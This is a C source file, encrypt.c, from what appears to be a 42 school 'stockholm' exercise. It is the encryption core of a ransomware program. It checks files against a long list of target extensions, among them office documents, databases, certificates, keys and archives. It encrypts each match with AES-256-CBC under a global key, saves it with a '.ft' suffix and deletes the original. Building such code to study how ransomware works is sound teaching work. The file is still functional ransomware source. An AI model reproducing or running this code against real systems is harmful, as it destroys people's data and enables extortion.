/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   encrypt.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nghaddar <nghaddar@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/09/10 12:07:25 by nghaddar          #+#    #+#             */
/*   Updated: 2025/09/12 11:58:18 by nghaddar         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "stockholm.h"

extern unsigned char SILENT_FLAG;
extern unsigned char *key;

static char	valid_extension(char *filename)
{
	char 		*file_extension = NULL;
	const char	*valid_extensions[] =
	{
		".123", ".3dm", ".3ds", ".3g2", ".3gp", ".602", ".7z", ".accdb", ".aes", ".ai", ".ARC", ".asc", ".asf", ".asm",
		".asp", ".avi", ".backup", ".bak", ".bat", ".bmp", ".brd", ".bz2", ".c", ".cgm", ".class", ".cmd", ".cpp",
		".crt", ".cs", ".csr", ".csv", ".db", ".dbf", ".dch", ".der", ".dif", ".dip", ".djvu", ".doc", ".docb", ".docm",
		".docx", ".dot", ".dotm", ".dotx", ".dwg", ".edb", ".eml", ".fla", ".flv", ".frm", ".gif", ".gpg", ".gz", ".h",
		".hwp", ".ibd", ".iso", ".jar", ".java", ".jpeg", ".jpg", ".js", ".jsp", ".key", ".lay", ".lay6", ".ldf", ".m3u",
		".m4u", ".max", ".mdb", ".mdf", ".mid", ".mkv", ".mml", ".mov", ".mp3", ".mp4", ".mpeg", ".mpg", ".msg", ".myd",
		".myi", ".nef", ".odb", ".odg", ".odp", ".ods", ".odt", ".onetoc2", ".ost", ".otg", ".otp", ".ots", ".ott", ".p12",
		".PAQ", ".pas", ".pdf", ".pem", ".pfx", ".php", ".pl", ".png", ".pot", ".potm", ".potx", ".ppam", ".pps", ".ppsm",
		".ppsx", ".ppt", ".pptm", ".pptx", ".ps1", ".psd", ".pst", ".rar", ".raw", ".rb", ".rtf", ".sch", ".sh", ".sldm",
		".sldx", ".slk", ".sln", ".snt", ".sql", ".sqlite3", ".sqlitedb", ".stc", ".std", ".sti", ".stw", ".suo",
		".svg", ".swf", ".sxc", ".sxd", ".sxi", ".sxm", ".sxw", ".tar", ".tbk", ".tgz", ".tif", ".tiff", ".txt", ".uop",
		".uot", ".vb", ".vbs", ".vcd", ".vdi", ".vmdk", ".vmx", ".vob", ".vsd", ".vsdx", ".wav", ".wb2", ".wk1", ".wks",
		".wma", ".wmv", ".xlc", ".xlm", ".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".zip"
	};
	
	file_extension = strrchr(filename, '.');
	if (!file_extension)
		return (0);

	for (int i = 0; i < (sizeof(valid_extensions) / sizeof(valid_extensions[0])); i++)
		if (!strcmp(file_extension, valid_extensions[i]))
			return (1);
	
	return (0);
}

void	encrypt_file(char *filename)
{
	FILE 			*in = NULL, *out = NULL;
	EVP_CIPHER_CTX 	*ctx = NULL;
	char 			*new_filename;
	unsigned char 	iv[16];
	unsigned char 	inbuf[1024];
	unsigned char 	outbuf[1024 + 16]; // 16 bytes for possible padding
	int 			inlen = 0, outlen = 0;

	if (!valid_extension(filename))
		return ;
		
	new_filename = malloc(strlen(filename) + 4);
	sprintf(new_filename, "%s%s", filename, ".ft");
	in = fopen(filename, "rb");
	out = fopen(new_filename, "wb");
	if (!in || !out)
	{
		perror(ANSI_RED "ERROR:");
		exit(1);
	}
	
	RAND_bytes(iv, 16);
	ctx = EVP_CIPHER_CTX_new();
	EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
	fwrite(iv, 16, 1, out);
	while ((inlen = fread(inbuf, 1, 1024, in)) != 0)
	{
		EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen);
		fwrite(outbuf, 1, outlen, out);
	}

	EVP_EncryptFinal_ex(ctx, outbuf, &outlen);
	fwrite(outbuf, 1, outlen, out);
	
	if (!SILENT_FLAG) printf(ANSI_GREEN "FILE: \"%s\" ENCRYPTED!\n" ANSI_RESET, filename);
	remove(filename); // delete original file
	EVP_CIPHER_CTX_free(ctx);
	fclose(in);
	fclose(out);
	free(new_filename);
	if (SLOW_MODE) usleep(SLOW_MODE_DELAY * 1000);
}